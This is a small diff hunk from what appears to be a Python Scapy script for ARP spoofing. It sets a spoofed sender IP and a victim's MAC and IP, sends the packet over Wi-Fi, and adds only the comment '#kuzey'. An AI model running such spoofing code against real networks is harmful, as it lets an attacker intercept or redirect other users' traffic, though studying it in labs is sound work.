@@ -14,6 +14,7 @@ arp[ARP].psrc = ipToSpoof    # Set the ARP sender protocol address to the IP to 
 arp[ARP].hwdst = macVictim    # Set the ARP target hardware address to the victim's MAC
 arp[ARP].pdst = ipVictim      # Set the ARP target protocol address to the victim's IP
 
+#kuzey
 
 sendp(arp, iface="Wi-Fi")
 
